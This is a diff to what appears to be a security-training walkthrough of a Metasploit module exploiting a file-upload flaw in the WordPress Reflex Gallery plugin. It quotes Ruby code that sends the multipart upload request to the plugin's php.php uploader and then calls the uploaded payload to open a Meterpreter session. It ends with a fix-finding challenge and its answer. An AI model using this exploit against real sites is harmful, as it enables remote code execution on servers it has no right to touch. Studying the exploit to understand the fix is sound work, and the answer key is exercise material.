@@ -335,7 +335,7 @@ def exploit
 ```
 Line 47 shows how the filename of the dropped payload is created randomly, and lines 49 - 51 show how the MIME attachment is created and how the encoded payload is added to it as a binary data stream, which is serialized as a string for the POST request.
 ```
-res = send_request_cgi({
+    res = send_request_cgi({
       'uri'       => normalize_uri(wordpress_url_plugins, 'reflex-gallery', 'admin', 'scripts', 'FileUploader', 'php.php'),
       'method'    => 'POST',
       'vars_get'  => {
@@ -348,7 +348,7 @@ res = send_request_cgi({
 ```
 And here's the multipart upload POST request, which just mimics what the browser sends to the WordPress server when the user uploads a file. The plugin accepts the binary content just as it would for an image. Note the uri value contains the components of the path to the vulnerable source in the plugin.
 ```
-     if res.code == 200 && res.body =~ /success|#{php_pagename}/
+        if res.code == 200 && res.body =~ /success|#{php_pagename}/
         print_good("Our payload is at: #{php_pagename}. Calling payload...")
         register_files_for_cleanup(php_pagename)
 ```
@@ -360,6 +360,34 @@ forensic evidence of the hack isn't left on the target server.
       'uri'       => normalize_uri(wordpress_url_wp_content, 'uploads', "#{year}", "#{month}", php_pagename)
     )
 ```
+Finally, the payload is activated via another HTTP request, which opens the
+Meterpreter connection.
+
+One takeaway from this is that the framework, MSF, is doing all the heavy
+lifting here: the payload is provided (even in encoded form), activating it is a
+single function call, and even the cleanup is provided as a core function. All
+the author had to do here was create and issue a multipart POST request.
+
+** Challenge **: Now that we've walked through the exploit, go back to the Reflex
+Gallery plugin code and identify the fix --- specifically, what was changed in
+the plugin code to prevent this attack?
+
+Hints:
+
+The plugin is written in PHP and Javascript --- which part would this fix need
+be in, and why?
+Use the source browser changelog viewer to diff specific commits
+If you ran the MSF exploit agains the fixed version of the plugin, what specifically would fail?
+Two files related to the vulnerability were substantially changed between the two versions
+
+Answer:
+```
+Removed the content of 
+admin/scripts/FileUploader/php.php and 
+admin/scripts/FileUploader/fileuploader.js files
+```
+## Milestone 7
+- [x] Hello `sqlmap`
 
 
 
